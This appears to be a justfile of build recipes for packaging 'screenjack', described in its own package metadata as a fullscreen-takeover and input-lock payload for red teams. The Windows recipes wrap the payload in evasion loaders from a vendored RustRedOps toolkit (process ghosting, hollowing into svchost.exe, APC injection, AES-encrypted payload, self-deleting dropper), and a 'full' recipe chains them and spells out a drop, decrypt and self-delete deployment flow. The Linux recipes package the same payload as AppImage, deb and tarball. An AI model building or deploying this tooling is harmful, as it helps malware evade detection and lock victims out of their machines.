set shell := ["bash", "-cu"]

# RustRedOps integration for advanced packaging
# Usage: just -f package.just <recipe>

vendor := "vendor/RustRedOps"
payload_bin := "target/x86_64-pc-windows-gnu/release/screenjack.exe"

# List available packaging options
default:
    @echo "Screenjack Packaging (RustRedOps integration)"
    @echo ""
    @echo "Recipes:"
    @echo "  ghost PAYLOAD      - Process Ghosting loader (stealthy execution)"
    @echo "  hollow PAYLOAD     - Process Hollowing into target process"
    @echo "  selfdel PAYLOAD    - Self-deleting dropper"
    @echo "  inject PAYLOAD     - DLL/shellcode injection variant"
    @echo "  encrypt PAYLOAD    - AES-encrypted payload with loader"
    @echo "  full PAYLOAD       - Full package: encrypted + ghost + selfdel"
    @echo ""
    @echo "Example: just -f package.just ghost ./screenjack.exe"

# Check RustRedOps submodule
_check-vendor:
    @if [ ! -d "{{ vendor }}" ]; then \
        echo "RustRedOps not found. Run: git submodule update --init"; \
        exit 1; \
    fi

# Build Process Ghosting loader wrapping the payload
ghost PAYLOAD: _check-vendor
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Building Process Ghosting loader..."

    # Convert payload to shellcode bytes for embedding
    PAYLOAD_PATH=$(realpath "{{ PAYLOAD }}")
    PAYLOAD_B64=$(base64 -w0 "$PAYLOAD_PATH")

    cd "{{ vendor }}/Process-Ghosting"

    # Build the ghosting loader
    cargo build --release --target x86_64-pc-windows-gnu 2>/dev/null || {
        echo "[!] Build failed - check RustRedOps Process-Ghosting requirements"
        exit 1
    }

    echo "[+] Ghost loader built: {{ vendor }}/Process-Ghosting/target/x86_64-pc-windows-gnu/release/"
    echo "[*] Note: Modify src/main.rs to embed your payload path or shellcode"

# Process Hollowing variant
hollow PAYLOAD TARGET="svchost.exe": _check-vendor
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Building Process Hollowing loader..."
    echo "[*] Target process: {{ TARGET }}"

    cd "{{ vendor }}/Process-Injection"
    cargo build --release --target x86_64-pc-windows-gnu 2>/dev/null || {
        echo "[!] Build failed"
        exit 1
    }

    echo "[+] Built. Inject screenjack into {{ TARGET }} at runtime."

# Self-deleting dropper
selfdel PAYLOAD: _check-vendor
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Building self-deleting dropper..."

    cd "{{ vendor }}/Self-Deletion"
    cargo build --release --target x86_64-pc-windows-gnu 2>/dev/null || {
        echo "[!] Build failed"
        exit 1
    }

    echo "[+] Self-deletion module built"
    echo "[*] Integrate with screenjack --persist for drop-and-delete pattern"

# AES encrypted payload
encrypt PAYLOAD: _check-vendor
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Encrypting payload with AES..."

    PAYLOAD_PATH=$(realpath "{{ PAYLOAD }}")
    KEY=$(openssl rand -hex 16)
    IV=$(openssl rand -hex 16)

    mkdir -p dist/encrypted
    openssl enc -aes-128-cbc -in "$PAYLOAD_PATH" -out "dist/encrypted/payload.enc" -K "$KEY" -iv "$IV"

    echo "[+] Encrypted payload: dist/encrypted/payload.enc"
    echo "[+] Key: $KEY"
    echo "[+] IV:  $IV"
    echo ""
    echo "Use {{ vendor }}/Encryption for Rust-based decryptor stub"

# DLL injection variant
inject PAYLOAD: _check-vendor
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Building injection loader..."

    cd "{{ vendor }}/APC-Injection"
    cargo build --release --target x86_64-pc-windows-gnu 2>/dev/null || {
        echo "[!] Build failed"
        exit 1
    }

    echo "[+] APC injection module built"

# Full package: encrypt + ghosting + self-delete
full PAYLOAD: _check-vendor
    #!/usr/bin/env bash
    set -euo pipefail
    just -f package.just encrypt "{{ PAYLOAD }}"
    just -f package.just selfdel "{{ PAYLOAD }}"
    just -f package.just ghost "{{ PAYLOAD }}"
    echo ""
    @echo "[+] Full package ready:"
    @echo "    - Encrypted payload in dist/encrypted/"
    @echo "    - Self-deletion module built"
    @echo "    - Process Ghosting loader built"
    @echo ""
    @echo "Deployment flow:"
    @echo "  1. Dropper decrypts payload.enc to temp"
    @echo "  2. Process Ghosting executes screenjack"
    @echo "  3. Self-deletion removes dropper"

# Show RustRedOps modules
list-modules:
    @echo "Available RustRedOps modules:"
    @ls -1 "{{ vendor }}" | grep -v LICENSE | grep -v README

# ============= LINUX PACKAGING =============

linux_payload := "payload/target/x86_64-unknown-linux-gnu/release/screenjack"
orchestra_bin := "orchestra/orchestra"

# Build AppImage (requires appimagetool)
appimage: _build-linux
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Creating AppImage..."

    mkdir -p dist/AppDir/usr/bin
    mkdir -p dist/AppDir/usr/share/applications
    mkdir -p dist/AppDir/usr/share/icons/hicolor/256x256/apps

    # Copy binaries
    cp "{{ linux_payload }}" dist/AppDir/usr/bin/screenjack
    [ -f "{{ orchestra_bin }}" ] && cp "{{ orchestra_bin }}" dist/AppDir/usr/bin/screenjack-tui || true

    # Create desktop file
    cat > dist/AppDir/usr/share/applications/screenjack.desktop << 'EOF'
    [Desktop Entry]
    Type=Application
    Name=Screenjack
    Exec=screenjack
    Icon=screenjack
    Categories=Utility;
    Terminal=true
    EOF
    cp dist/AppDir/usr/share/applications/screenjack.desktop dist/AppDir/screenjack.desktop

    # Create simple icon (placeholder)
    convert -size 256x256 xc:'#D97706' -fill white -gravity center \
        -pointsize 72 -annotate 0 'SJ' dist/AppDir/usr/share/icons/hicolor/256x256/apps/screenjack.png 2>/dev/null || \
        echo "[!] No imagemagick, skipping icon"
    [ -f dist/AppDir/usr/share/icons/hicolor/256x256/apps/screenjack.png ] && \
        cp dist/AppDir/usr/share/icons/hicolor/256x256/apps/screenjack.png dist/AppDir/screenjack.png || true

    # Create AppRun
    cat > dist/AppDir/AppRun << 'EOF'
    #!/bin/bash
    SELF=$(readlink -f "$0")
    HERE=${SELF%/*}
    exec "$HERE/usr/bin/screenjack" "$@"
    EOF
    chmod +x dist/AppDir/AppRun

    # Build AppImage
    if command -v appimagetool &>/dev/null; then
        ARCH=x86_64 appimagetool dist/AppDir dist/screenjack-x86_64.AppImage
        echo "[+] AppImage: dist/screenjack-x86_64.AppImage"
    else
        echo "[!] appimagetool not found. Install from: https://github.com/AppImage/AppImageKit"
        echo "[*] AppDir ready at: dist/AppDir/"
    fi

# Build .deb package
deb VERSION="0.1.0": _build-linux
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Creating .deb package..."

    PKG="dist/screenjack_{{ VERSION }}_amd64"
    mkdir -p "$PKG/DEBIAN"
    mkdir -p "$PKG/usr/bin"
    mkdir -p "$PKG/usr/share/doc/screenjack"

    # Copy binary
    cp "{{ linux_payload }}" "$PKG/usr/bin/screenjack"
    chmod 755 "$PKG/usr/bin/screenjack"

    # Control file
    cat > "$PKG/DEBIAN/control" << EOF
    Package: screenjack
    Version: {{ VERSION }}
    Section: utils
    Priority: optional
    Architecture: amd64
    Maintainer: ARaChn3
    Description: Fullscreen takeover + input lock payload
     Educational red team tool for screen hijacking demonstrations.
    EOF

    # Copyright
    cat > "$PKG/usr/share/doc/screenjack/copyright" << 'EOF'
    Format: https://www.debian.org/doc/packaging-manuals/copyright-format/1.0/
    Upstream-Name: screenjack
    License: MIT
    EOF

    # Build deb
    dpkg-deb --build "$PKG"
    echo "[+] Package: ${PKG}.deb"

# Build tarball
tarball VERSION="0.1.0": _build-linux
    #!/usr/bin/env bash
    set -euo pipefail
    echo "[*] Creating tarball..."

    mkdir -p dist/screenjack-{{ VERSION }}
    cp "{{ linux_payload }}" dist/screenjack-{{ VERSION }}/screenjack
    [ -f "{{ orchestra_bin }}" ] && cp "{{ orchestra_bin }}" dist/screenjack-{{ VERSION }}/screenjack-tui || true
    cp README.md dist/screenjack-{{ VERSION }}/ 2>/dev/null || true

    cd dist && tar czvf screenjack-{{ VERSION }}-linux-x86_64.tar.gz screenjack-{{ VERSION }}
    echo "[+] Tarball: dist/screenjack-{{ VERSION }}-linux-x86_64.tar.gz"

# Helper: build linux payload if needed
_build-linux:
    @if [ ! -f "{{ linux_payload }}" ]; then \
        echo "[*] Building Linux payload first..."; \
        cd payload && cargo build --release --target x86_64-unknown-linux-gnu; \
    fi
